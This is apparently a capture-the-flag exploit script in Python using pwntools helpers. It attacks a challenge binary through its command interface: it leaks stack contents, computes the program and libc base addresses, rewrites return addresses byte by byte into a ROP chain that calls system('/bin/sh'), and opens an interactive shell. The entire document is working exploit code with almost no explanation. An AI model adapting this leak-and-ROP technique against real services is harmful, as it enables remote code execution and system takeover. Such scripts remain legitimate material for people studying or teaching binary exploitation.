#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
# elf: ELF = gift.elf
# libc: ELF = gift.libc


def convert(one_byte):
    temp_val = ord(one_byte)
    if temp_val >= 0 and temp_val < 0x20:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0x20 and temp_val < 0x40:
        return bytes([(temp_val - 0x20)])
    elif temp_val >= 0x40 and temp_val < 0x60:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0x60 and temp_val < 0x80:
        return bytes([(temp_val - 0x20)])
    elif temp_val >= 0x80 and temp_val < 0xA0:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0xA0 and temp_val < 0xC0:
        return bytes([(temp_val - 0x20)])
    elif temp_val >= 0xC0 and temp_val < 0xE0:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0xE0 and temp_val < 0x100:
        return bytes([(temp_val - 0x20)])


def cmd(insn, in_bin=False):
    if not in_bin:
        insn = insn.encode()
    ru(b"> ")
    sl(insn)


def change_8(now, target):
    now_list = p64_ex(now)
    target_list = p64_ex(target)
    for i in range(8):
        if now_list[i] < target_list[i]:
            temp = target_list[i] - now_list[i]
            cmd(i2b(temp) + b"wd", True)
        elif now_list[i] > target_list[i]:
            temp = now_list[i] - target_list[i]
            cmd(i2b(temp) + b"sd", in_bin=True)
        else:
            cmd("d")


def leak_up(word_off, GOBACK=True):
    cmd(str(word_off * 8) + "w" + str(word_off * 8) + "a")
    leak = u64_ex(ru(b"\n", drop=True)[:8])
    if GOBACK:
        cmd(str(word_off * 8) + "s" + str(word_off * 8) + "d")
    print(word_off, end="\t")
    lg("leak", leak)
    return leak


def leak_down(word_off, GOBACK=True):
    cmd(str(word_off * 8) + "s" + str(word_off * 8) + "d")
    leak = u64_ex(ru(b"\n", drop=True)[:8])
    if GOBACK:
        cmd(str(word_off * 8) + "w" + str(word_off * 8) + "a")
    print(word_off, end="\t")
    lg("leak", leak)
    return leak


def dump_stack(leak_times):
    stack_dump = []
    for i in range(leak_times):
        temp = leak_up(i)
        stack_dump.append(temp)

    for i in range(len(stack_dump)):
        # lg("stack", stack_dump[len(stack_dump) - 1 - i])
        lg("stack", stack_dump[i])


ru(b"A]aaaaaa")
cmd(" ")
cmd("8d")

# dump_stack(20)

elf_leak = leak_down(1)
elf_base = elf_leak - 0x540
stop_gadget = elf_base + 0x215
brop_gadget = elf_base + 0x5D2
pop_rsi_r15_ret = brop_gadget + 7
pop_rdi_ret = brop_gadget + 9
ret_addr = brop_gadget + 10
puts_plt = elf_base + 0x60
puts_got = elf_base + 0x3030

# try_ret = elf_base + 0x130 + 4
# ret_gadget = elf_base + 0x131
main_addr = elf_base + 0xE0

try_offsets = [
    0x72230,  # 0x6C230,  # 0x7F230,  # puts
    0x45E50,  # 0x42310,  # 0x4FC20,  # system
    0x195152,  # 0x187583,  # 0x1BAFCA,  # binsh
]

elf_leak2 = leak_up(6)
cmd("40d")
change_8(elf_leak2, pop_rdi_ret)
cmd("48a")

leak = leak_up(7)
libc_addr = leak + 0x4EA61 - try_offsets[0]
cmd("48d")
change_8(leak, libc_addr + try_offsets[2])
cmd("56a")

leak = leak_up(8)
cmd("56d")
change_8(leak, libc_addr + try_offsets[1])
cmd("64a")

leak = leak_up(9)
cmd("64d")
change_8(leak, stop_gadget)
cmd("72a")

leak_up(6)
leak_up(7)
leak_up(8)

cmd("8a16a24w")
# sl()
# ru(b"!\n")
# puts_addr = u64_ex(ru(b"\n", drop=True))
# lg("puts_addr", puts_addr)
lg("libc_addr", libc_addr)

ia()
